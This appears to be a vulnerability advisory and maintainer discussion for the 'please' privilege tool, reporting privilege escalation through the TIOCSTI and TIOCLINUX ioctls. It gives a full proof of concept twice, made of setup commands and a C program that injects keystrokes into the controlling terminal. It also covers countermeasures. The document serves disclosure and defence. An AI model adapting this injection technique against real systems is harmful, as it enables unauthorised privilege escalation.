Note that the reproducer doesn't work out of the box on a modern kernel, as the ioctl TIOCSTI is disabled by default nowadays.

| Thank you for the report!  This is clearly a security issue with a published PoC that has not been addressed for 5 months, so I am going to merge this directly and notify the upstream issue after the fact.  Could you also add a note that many modern Linux distributions disable that IOCTL, and a way to test if your system is vulnerable? That would make the advisory more actionable.  I believe simply running `sysctl dev.tty.legacy_tiocsti` should show it, and if set to `1` it would be exploitable. Could you confirm that this command outputs 0 on the systems that are not affected? |

| Ah, good point about `TIOCLINUX`!  If the steps only cover part of the attack surface, it is best to leave them out. No reason to give a false sense of security when `TIOCSTI` is disabled but `TIOCLINUX` is not. |

# [Git master] Vulnerable to privilege escalation using ioctls TIOCSTI and TIOCLINUX

Hi!

I believe that `please` is vulnerabily to privilege escalation using ioctls `TIOCSTI` and `TIOCLINUX`. Here is how to see it in action:

```
$ cd "$(mktemp -d)"
$ git clone --depth 1 https://gitlab.com/edneville/please.git
$ cd please/
$ git rev-parse HEAD  # f3598f8fae5455a8ecf22afca19eaba7be5053c9
$ cargo test && cargo build --release
$ echo "[${USER}_as_nobody]"$'\nname='"${USER}"$'\ntarget=nobody\nrule=.*\nrequire_pass=false' | sudo tee /etc/please.ini
$ sudo chown root:root ./target/release/please
$ sudo chmod u+s ./target/release/please
$ cat <<TIOCSTI_C_EOF | tee TIOCSTI.c
#include <sys/ioctl.h>

int main(void) {
  const char *text = "id\n";
  while (*text)
    ioctl(0, TIOCSTI, text++);
  return 0;
}
TIOCSTI_C_EOF
$ gcc -std=c99 -Wall -Wextra -pedantic -o /tmp/TIOCSTI TIOCSTI.c
$ ./target/release/please -u nobody /tmp/TIOCSTI  # runs id(1) as ${USER} rather than nobody
```

Please note that:

* This affects both the case where root wants to drop privileges as well when non-root wants to gain other privileges.
* [ttyjack](https://github.com/jwilk/ttyjack) allows playing with `TIOCSTI` and `TIOCLINUX` comfortably.
* Of the three known options for counter measures, use of a PTY is currently considered the best solution.
* For a list of other software known affected by this issue see <https://github.com/hartwork/antijack#related-cves-not-mine> .
* The code above is inspired by <https://github.com/containers/bubblewrap/issues/142> .

Best, Sebastian

### Description

please is vulnerable to privilege escalation using ioctls TIOCSTI
and TIOCLINUX on systems where they are not disabled.

Here is how to see it in action:

```
$ cd "$(mktemp -d)"
$ git clone --depth 1 https://gitlab.com/edneville/please.git
$ cd please/
$ git rev-parse HEAD  # f3598f8fae5455a8ecf22afca19eaba7be5053c9
$ cargo test && cargo build --release
$ echo "[${USER}_as_nobody]"$'\nname='"${USER}"$'\ntarget=nobody\nrule=.*\nrequire_pass=false' | sudo tee /etc/please.ini
$ sudo chown root:root ./target/release/please
$ sudo chmod u+s ./target/release/please
$ cat <<TIOCSTI_C_EOF | tee TIOCSTI.c
#include <sys/ioctl.h>

int main(void) {
  const char *text = "id\n";
  while (*text)
    ioctl(0, TIOCSTI, text++);
  return 0;
}
TIOCSTI_C_EOF
$ gcc -std=c99 -Wall -Wextra -pedantic -o /tmp/TIOCSTI TIOCSTI.c
$ ./target/release/please -u nobody /tmp/TIOCSTI  # runs id(1) as ${USER} rather than nobody

```

Please note that:

This affects both the case where root wants to drop privileges as well when non-root wants to gain other privileges.
